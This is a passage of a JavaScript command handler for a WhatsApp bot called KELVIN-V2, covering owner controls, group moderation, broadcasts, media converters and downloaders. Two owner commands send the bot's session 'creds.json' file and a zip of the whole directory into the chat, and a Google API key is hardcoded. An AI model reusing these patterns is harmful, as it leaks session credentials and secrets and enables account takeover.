                replydare('Wait a moment, currently retrieving your session file')
                let sesi = await fs.readFileSync('./session/creds.json')
                dare.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
                break
            case 'shutdown':
                if (!isCreator) return replydare(mess.owner)
                replydare(`Goodbye🖐`)
                await sleep(3000)
                process.exit()
                break
            case 'restart':
                if (!isCreator) return replydare(mess.owner)
                replydare('In Process....')
                exec('pm2 restart all')
                break
            case 'autoread':
                if (!isCreator) return replydare(mess.owner)
                if (args.length < 1) return replydare(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoread = true
                    replydare(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    replydare(`Successfully changed autoread to ${q}`)
                }
                break
                case 'autotyping':
                if (!isCreator) return replydare(mess.owner)
                if (args.length < 1) return replydare(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoTyping = true
                    replydare(`Successfully changed auto-typing to ${q}`)
                } else if (q === 'off') {
                    autoTyping = false
                    replydare(`Successfully changed auto-typing to ${q}`)
                }
                break
                case 'autorecording':
                if (!isCreator) return replydare(mess.owner)
                if (args.length < 1) return replydare(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoRecording = true
                    replydare(`Successfully changed auto-recording to ${q}`)
                } else if (q === 'off') {
                    autoRecording = false
                    replydare(`Successfully changed auto-recording to ${q}`)
                }
                break
                case 'autorecordtyp':
                if (!isCreator) return replydare(mess.owner)
                if (args.length < 1) return replydare(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autorecordtype = true
                    replydare(`Successfully changed auto recording and typing to ${q}`)
                } else if (q === 'off') {
                    autorecordtype = false
                    replydare(`Successfully changed auto recording and typing to ${q}`)
                }
                break
                case 'autoswview':
    case 'autostatusview':{
             if (!isCreator) return replydare(mess.owner)
               if (args.length < 1) return replydare('on/off?')
               if (args[0] === 'on') {
                  autoswview = true
                  replydare(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  autoswview = false
                  replydare(`${command} is disabled`)
               }
            }
            break
            case 'autobio':
                if (!isCreator) return replydare(mess.owner)
                if (args.length < 1) return replydare(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    autobio = true
                    replydare(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    autobio = false
                    replydare(`Successfully Changed AutoBio To ${q}`)
                }
                break
            case 'mode':
                if (!isCreator) return replydare(mess.owner)
                if (args.length < 1) return replydare(`Example ${prefix + command} public/self`)
                if (q == 'public') {
                    dare.public = true
                    replydare(mess.done)
                } else if (q == 'self') {
                    dare.public = false
                    replydare(mess.done)
                }
                break
            case 'setexif':
                if (!isCreator) return replydare(mess.owner)
                if (!text) return replydare(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replydare(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                break
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                if (!isCreator) return replydare(mess.owner)
                if (!quoted) return replydare(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replydare(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replydare(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await dare.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await dare.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replydare(mess.done)
                } else {
                    var memeg = await dare.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replydare(mess.done)
                }
                break
            case 'block':
                if (!isCreator) return replydare(mess.owner)
                let blockw = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await dare.updateBlockStatus(blockw, 'block').then((res) => replydare(json(res))).catch((err) => replydare(json(err)))
                break
            case 'unblock':
                if (!isCreator) return replydare(mess.owner)
                let blockww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await dare.updateBlockStatus(blockww, 'unblock').then((res) => replydare(json(res))).catch((err) => replydare(json(err)))
                break
            case 'leave':
                if (!isCreator) return replydare(mess.owner)
                if (!m.isGroup) return replydare(mess.group)
                replydare('Bye Everyone 🥺')
                await dare.groupLeave(m.chat)
                break
            case 'backup':
                if (!isCreator) return replydare(mess.owner)
                if (m.isGroup) return replydare(mess.private)
                replydare(mess.wait)
                exec('zip backup.zip *')
                let malas = await fs.readFileSync('./backup.zip')
                await dare.sendMessage(m.chat, {
                    document: malas,
                    mimetype: 'application/zip',
                    fileName: 'backup.zip'
                }, {
                    quoted: m
                })
                break
            case 'bcgc':
            case 'bcgroup': {
                if (!isCreator) return replydare(mess.owner)
                if (!text) return replydare(`Which text?\n\nExample : ${prefix + command} It's holiday tomorrow `)
                let getGroups = await dare.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let xmenu_oh = groups.map(v => v.id)
                replydare(`Send Broadcast To ${xmenu_oh.length} Group Chat, End Time ${xmenu_oh.length * 1.5} second`)
                for (let i of xmenu_oh) {
                    await sleep(1500)
                    let a = '```' + `\n\n${text}\n\n` + '```' + '\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ'
                    dare.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: 'Broadcast By Owner',
                                body: `Sent ${i.length} Group`,
                                thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replydare(`Successfully Sent Broadcast To ${xmenu_oh.length} Group`)
            }
            break       
            
            case 'delete':
            case 'del': {
                if (!isCreator) return replydare(mess.done)
                if (!m.quoted) throw false
                let {
                    chat,
                    fromMe,
                    id,
                    isBaileys
                } = m.quoted
                if (!isBaileys) return replydare('The message was not sent by a bot!')
                dare.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: true,
                        id: m.quoted.id,
                        participant: m.quoted.sender
                    }
                })
            }
            break

            case 'closetime':
                if (!m.isGroup) return replydare(mess.group)
                if (!isAdmins && !isCreator) return replydare(mess.admin)
                if (!isBotAdmins) return replydare(mess.botAdmin)
                if (args[1] == 'detik') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'menit') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'jam') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'hari') {
                    var timer = args[0] * `86400000`
                } else {
                    return replydare('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replydare(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Closed* group closed by admin\nnow only admin can send messages`
                    dare.groupSettingUpdate(m.chat, 'announcement')
                    replydare(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return replydare(mess.group)
                if (!isAdmins && !isCreator) return replydare(mess.admin)
                if (!isBotAdmins) return replydare(mess.botAdmin)
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replydare('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replydare(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Opened* The group is opened by admin\nNow members can send messages`
                    dare.groupSettingUpdate(m.chat, 'not_announcement')
                    replydare(open)
                }, timer)
                break
            case 'kick':
                if (!m.isGroup) return replydare(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replydare(mess.admin)
                if (!isBotAdmins) return replydare(mess.botAdmin)
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await dare.groupParticipantsUpdate(m.chat, [blockwww], 'remove').then((res) => replydare(json(res))).catch((err) => replydare(json(err)))
                break
            case 'add':
                if (!m.isGroup) return replydare(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replydare(mess.admin)
                if (!isBotAdmins) return replydare(mess.botAdmin)
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await dare.groupParticipantsUpdate(m.chat, [blockwwww], 'add').then((res) => replydare(json(res))).catch((err) => replydare(json(err)))
                break
            case 'promote': {
if (!isCreator) return replydare('*Only Premium Members Are Allowed To Use This Command*')
if (!m.isGroup) return replydare('Create In Stupid Group ')
if (!isBotAdmins) return replydare('Bots are not admins, dude ')
if (!isAdmins) return replydare('I thought you were the group admin ')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await dare.groupParticipantsUpdate(from, [users], 'promote')
}
break
            case 'demote':
                if (!m.isGroup) return replydare(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replydare(mess.admin)
                if (!isBotAdmins) return replydare(mess.botAdmin)
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await dare.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote').then((res) => replydare(json(res))).catch((err) => replydare(json(err)))
                break
            case 'setname':
            case 'setsubject':
                if (!m.isGroup) return replydare(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replydare(mess.admin)
                if (!isBotAdmins) return replydare(mess.botAdmin)
                if (!text) return 'Text ?'
                await dare.groupUpdateSubject(m.chat, text).then((res) => replydare(mess.success)).catch((err) => replydare(json(err)))
                break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return replydare(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replydare(mess.admin)
                if (!isBotAdmins) return replydare(mess.botAdmin)
                if (!text) return 'Text ?'
                await dare.groupUpdateDescription(m.chat, text).then((res) => replydare(mess.success)).catch((err) => replydare(json(err)))
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
                if (!m.isGroup) return replydare(mess.group)
                if (!isAdmins) return replydare(mess.admin)
                if (!isBotAdmins) return replydare(mess.botAdmin)
                if (!quoted) return replydare(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replydare(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replydare(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await dare.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await dare.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replydare(mess.done)
                } else {
                    var memeg = await dare.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replydare(mess.done)
                }
                break
            case 'tagall':
                if (!m.isGroup) return replydare(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator && !isPremium) return replydare(mess.admin)
                if (!isBotAdmins && !isCreator && !isPremium) return replydare(mess.botAdmin)
                let teks = `*👥 Tag All*
 
                 🗞️ *Message : ${q ? q : 'blank'}*\n\n`
                for (let mem of participants) {
                    teks += `• @${mem.id.split('@')[0]}\n`
                }
                dare.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'hidetag':
                if (!m.isGroup) return replydare(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator && !isPremium) return replydare(mess.admin)
                if (!isBotAdmins && !isCreator && !isPremium) return replydare(mess.botAdmin)
                dare.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'totag':
                if (!m.isGroup) return replydare(mess.group)
                if (!isBotAdmins && !isCreator && !isPremium) return replydare(mess.botAdmin)
                if (!isAdmins && !isCreator && !isPremium) return replydare(mess.admin)
                if (!m.quoted) return replydare(`Reply messages with captions ${prefix + command}`)
                dare.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                break
            case 'group':
            case 'grup':
                if (!m.isGroup) return replydare(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replydare(mess.admin)
                if (!isBotAdmins) return replydare(mess.botAdmin)
                if (args[0] === 'close') {
                    await dare.groupSettingUpdate(m.chat, 'announcement').then((res) => replydare(`Success In Closing The Group 🕊️`)).catch((err) => replydare(json(err)))
                } else if (args[0] === 'open') {
                    await dare.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replydare(`Success In Opening The Group 🕊️`)).catch((err) => replydare(json(err)))
                } else {
                    replydare(`Mode ${command}\n\n\nType ${prefix + command}open/close`)
                }
                break
            case 'editinfo':
                if (!m.isGroup) return replydare(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replydare(mess.admin)
                if (!isBotAdmins) return replydare(mess.botAdmin)
                if (args[0] === 'open') {
                    await dare.groupSettingUpdate(m.chat, 'unlocked').then((res) => replydare(`Successfully Opened Group Edit Info 🕊️`)).catch((err) => replydare(json(err)))
                } else if (args[0] === 'close') {
                    await dare.groupSettingUpdate(m.chat, 'locked').then((res) => replydare(`Successfully Closed Group Edit Info🕊️`)).catch((err) => replydare(json(err)))
                } else {
                    replydare(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
                }
                break
            case 'linkgroup':
            case 'grouplink':
            case 'linkgrup':
            case 'linkgc':
                if (!m.isGroup) return replydare(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replydare(mess.admin)
                if (!isBotAdmins) return replydare(mess.botAdmin)
                let response = await dare.groupInviteCode(m.chat)
                dare.sendText(m.chat, `👥 *GROUP LINK INFO*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Group Owner :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
                break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return replydare(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replydare(mess.admin)
                if (!isBotAdmins) return replydare(mess.botAdmin)
                await dare.groupRevokeInvite(m.chat)
                    .then(res => {
                        replydare(`Successful Reset, Group Invite Link ${groupMetadata.subject}`)
                    }).catch((err) => replydare(json(err)))
                break
                case 'p':
            case 'ping': {
await loading();
  const startTime = new Date();
  const pingMsg = await dare.sendMessage(m.chat, { 
    text: '🔄 *KELVIN-V2* 🔄\n\n🕒 *Checking Speed...*' 
  });

  // Delay before editing the message
  setTimeout(async () => {
    await dare.relayMessage(m.chat, {
      protocolMessage: {
        key: pingMsg.key,
        type: 14,
        editedMessage: {
          conversation: `
━━━━━━━━━━━━━━━━━━━━━
⚡ *KELVIN-V2 𝐒𝐏𝐄𝐄𝐃* ⚡
📶 *Response Time:* 
${new Date() - startTime} 𝙼𝚂
━━━━━━━━━━━━━━━━━━━━━
🚀 *Optimized for Speed!*

> KELVIN-V2
          `.trim()
        }
      }
    }, {});
  }, 1000); // 1000 ms delay (1 second)
}
break;
                
            case 'buypremium':
            case 'buyprem':
            case 'premium': {
                let teks = `Hi ${pushname}👋\nWant to Buy Premium? Just chat with the owner😉`
                await dare.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `${ownername}`,
                            thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'runtime':
                let runtimetext = `Bots Have Been Running For ${runtime(process.uptime())}`
                dare.sendMessage(m.chat, {
                    text: runtimetext,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `FORGET DONATE`,
                            thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
            case 'sc':
            case 'script':
            case 'scriptbot':
                dare.sendMessage(m.chat, {
                    text: `🫂not available yet`,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `SCRIPT OF ${botname} ASK KELVIN-V2 `,
                            thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
            case 'donate':
            case 'donasi':
                let textnate = `Hello Brother ${pushname}\n\nNo matter how much you donate is very valuable for us`
                dare.sendMessage(m.chat, {
                    text: '+263 77 729 9565 momo\n\n' + textnate
                }, {
                    quoted: m
                })
                break

case 'owner': {
const repf = await dare.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
dare.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Here is my handsome owner😇`, mentions: [sender]}, { quoted: repf })
}
break

case 'play': {
 if (!text) return reply(`*Example*: ${prefix + command} Faded by Alan Walker`);

 try {
 
 await dare.sendMessage(m.chat, { react: { text: `🎵`, key: m.key } });

 
 const yts = require("yt-search");
 const search = await yts(text);
 const video = search.videos[0]; 

 if (!video) {
 reply(`*No results found for:* ${text}`);
 return;
 }

 
 const body = `*MUSIC - PLAYER*\n` +
 `> *Title:* ${video.title}\n` +
 `> *Views:* ${video.views}\n` +
 `> *Duration:* ${video.timestamp}\n` +
 `> *Uploaded:* ${video.ago}\n` +
 `> *Url:* ${video.url}\n` +
 `> PLAY,SONG,MUSIC,SPOTIFY,SPDL.`;

 await dare.sendMessage(m.chat, {
 image: { url: video.thumbnail },
 caption: body
 }, { quoted: m });

 
 const apiUrl = `https://api.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(video.url)}`;
 const apiResponse = await axios.get(apiUrl);

 if (apiResponse.data.success) {
 const { download_url, title, thumbnail } = apiResponse.data.result;

 
 await dare.sendMessage(m.chat, {
 audio: { url: download_url },
 mimetype: 'audio/mp4',
 fileName: `${title}.mp3`,
 caption: `🎧 *Here's your song:*\n> *Title:* ${title}`
 }, { quoted: m });
 } else {
 reply(`*Failed to fetch the song! Please try again later.*`);
 }
 } catch (error) {
 console.error('Error during /play command:', error);
 reply(`*An error occurred while processing your request. Please try again later.*`);
 }
 break;
}

case 'video': {
    if (!text) return reply(`*Example*: ${prefix + command} Faded by Alan Walker 🎵`);

    try {
        // React with a camera emoji to indicate video fetching
        await dare.sendMessage(m.chat, { react: { text: `📽️`, key: m?.key } });

        const yts = require("yt-search");
        let search = await yts(text);
        let video = search.all[0]; 
        
        // Construct message body with video details
        let body = `🎬 *VIDEO PLAYER* 🎬\n` +
                   `> 🎥 *Title:* *${video.title}*\n` +
                   `> 👀 *Views:* *${video.views}*\n` +
                   `> ⏱️ *Duration:* *${video.timestamp}*\n` +
                   `> 🗓️ *Uploaded:* *${video.ago}*\n` +
                   `> 🔗 *URL:* *${video.url}*`;

        // Send the video thumbnail and details
        await dare.sendMessage(m.chat, {
            image: { url: video.thumbnail },
            caption: body
        }, { quoted: m });

        const apiUrl = `https://api.davidcyriltech.my.id/download/ytmp4`;
        const apiResponse = await axios.get(apiUrl, {
            params: { url: video.url }
        });

        // Check if the video download URL is successful
        if (apiResponse.data.success) {
            const { title, download_url } = apiResponse.data.result;

            // Send the video file directly with a cool caption
            await dare.sendMessage(m.chat, {
                video: { url: download_url },
                mimetype: 'video/mp4',
                caption: `🎬 *Title:* ${title}\n\n> 🔥 POWERED BY KELVIN 💥`
            }, { quoted: m });
        } else {
            reply(`❌ *Error fetching the video!* Please try again later. 😓`);
        }
    } catch (error) {
        console.error('Error during video command:', error);
        reply(`⚠️ *An error occurred while processing your request.* Please try again. 🙏`);
    }
    break;
}

            case 'sticker':
            case 'stiker':
            case 's': {
                if (!quoted) return replydare(`Reply to Video/Image With Caption ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await dare.sendImageAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (isVideo || /video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return replydare('Maximum 10 seconds!')
                    let media = await quoted.download()
                    let encmedia = await dare.sendVideoAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return replydare(`Send Images/Videos With Captions ${prefix + command}\nVideo Duration 1-9 Seconds`)
                }
            }
            break
            case 'smeme': {
                let respond = `Send/Reply image/sticker with caption ${prefix + command} text1|text2`
                if (!/image/.test(mime)) return replydare(respond)
                if (!text) return replydare(respond)
                replydare(mess.wait)
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await dare.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
                let pop = await dare.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,
                    author: author
                })
                fs.unlinkSync(pop)
            }
            break
case 'swm': case 'steal': case 'stickerwm': case 'xmenu_ohe':{
if (!args.join(" ")) return replydare(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
dare.downloadAndSaveMediaMessage(quoted, "gifee")
dare.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await dare.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replydare('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await dare.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replydare(`Photo/Video?`)
}
}
break
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return replydare(`Reply sticker with caption *${prefix + command}*`)
                replydare(mess.wait)
                let media = await dare.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    dare.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return replydare(`Reply sticker with caption *${prefix + command}*`)
                replydare(mess.wait)
                let media = await dare.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await dare.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replydare(`Send/Reply Video/Audio that you want to make into audio with caption ${prefix + command}`)
                replydare(mess.wait)
                let media = await dare.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                dare.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replydare(`Send/Reply Video/Audio that you want to make into MP3 with caption ${prefix + command}`)
                replydare(mess.wait)
                let media = await dare.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                dare.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `11.mp3`
                }, {
                    quoted: m
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replydare(`Reply Video/Audio that you want to make into a VN with caption ${prefix + command}`)
                replydare(mess.wait)
                let media = await dare.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                dare.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return replydare(`Reply sticker with caption *${prefix + command}*`)
                replydare(mess.wait)
                let media = await dare.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await dare.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break

            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replydare(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replydare(`Example : ${prefix + command} 😅+🤔`)
                replydare(mess.wait)
                let xmenu_oh = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of xmenu_oh.results) {
                    let encmedia = await dare.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
            break
            case 'toonce':
            case 'toviewonce': {
                if (!quoted) return replydare(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    xmenu_ohan = await dare.downloadAndSaveMediaMessage(quoted)
                    dare.sendMessage(m.chat, {
                        image: {
                            url: xmenu_ohan
                        },
                        caption: `Here you go!`,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    xmenu_ohxmenu_ohan = await dare.downloadAndSaveMediaMessage(quoted)
                    dare.sendMessage(m.chat, {
                        video: {
                            url: xmenu_ohxmenu_ohan
                        },
                        caption: `Here you go!`,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                }
            }
            break
            case 'toqr': {
                if (!q) return replydare(' Please include link or text!')
                const QrCode = require('qrcode-reader')
                const qrcode = require('qrcode')
                let qyuer = await qrcode.toDataURL(q, {
                    scale: 35
                })
                let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
                let buff = getRandom('.jpg')
                await fs.writeFileSync('./' + buff, data)
                let medi = fs.readFileSync('./' + buff)
                await dare.sendMessage(from, {
                    image: medi,
                    caption: "Here you go!"
                }, {
                    quoted: m
                })
                setTimeout(() => {
                    fs.unlinkSync(buff)
                }, 10000)
            }
            break
            case 'fliptext': {
                if (args.length < 1) return replydare(`Example:\n${prefix}fliptext Xeony`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replydare(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
            case 'listvn': {
                let teks = '┌──⭓「 *List Vn* 」\n│\n'
                for (let x of VoiceNoteXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VoiceNoteXeon.length}*`
                replydare(teks)
            }
            break
            case 'liststicker': {
                let teks = '┌──⭓「 *List Sticker* 」\n│\n'
                for (let x of StickerXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${StickerXeon.length}*`
                replydare(teks)
            }
            break
            case 'listimage': {
                let teks = '┌──⭓「 *List Image* 」\n│\n'
                for (let x of Imagedare) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${Imagedare.length}*`
                replydare(teks)
            }
            break
            case 'listvideo': {
                let teks = '┌──⭓「 *List Video* 」\n│\n'
                for (let x of VideoXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VideoXeon.length}*`
                replydare(teks)
            }
            break
            case 'addowner':
                if (!isCreator) return replydare(mess.owner)
if (!args[0]) return replydare(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await dare.onWhatsApp(bnnd)
if (ceknye.length == 0) return replydare(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./dtbs/owner.json', JSON.stringify(owner))
replydare(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
